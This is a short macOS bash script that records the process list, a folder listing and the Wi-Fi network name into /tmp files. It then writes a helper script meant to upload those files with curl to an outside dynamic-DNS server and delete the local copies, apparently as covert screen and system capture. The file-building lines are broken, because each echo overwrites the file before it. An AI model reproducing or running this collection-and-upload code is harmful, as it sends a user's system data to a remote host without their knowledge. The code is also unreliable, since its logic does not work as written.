#!/bin/bash

echo $(date) > /tmp/screen_mac_date.txt
ps -ef > /tmp/screen_mac_000_psef.txt


echo 'find /tmp/ -name screen_mac* -type f -print | while read -r file ; do' > /Users/Vladdy/Library/Cron/scrcap_kk.sh
echo '  echo "uploading $file" ' > /Users/Vladdy/Library/Cron/scrcap_kk.sh
echo '  curl -X POST --form file=@$file http://kk61676.ddns.net:3001/file || break'  > /Users/Vladdy/Library/Cron/scrcap_kk.sh
#  # sleep 1
echo '  rm $file ' > /Users/Vladdy/Library/Cron/scrcap_kk.sh
echo 'done' > /Users/Vladdy/Library/Cron/scrcap_kk.sh

ps -ef | grep scrcap_kk || /Users/Vladdy/Library/Cron/scrcap_kk.sh

sleep 2

ls -la /Users/Vladdy/Library/Cron/ > /tmp/screen_mac_000_uvlc_lsla.txt

networksetup -getairportnetwork en0 > /tmp/screen_mac_000_get_airport_net.txt || true

#sudo ln -s /System//Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport /usr/local/bin/airport || true
#sudo /System//Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport -I  2>&1 > /tmp/screen_mac_airport_I.txt || true
#sudo /System//Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport -s  2>&1 > /tmp/screen_mac_airport_s.txt || true
#which airport > /tmp/screen_mac_which_airport.txt || true
#sudo find /System/ | grep airport > /tmp/screen_mac_grep_airport.txt || true
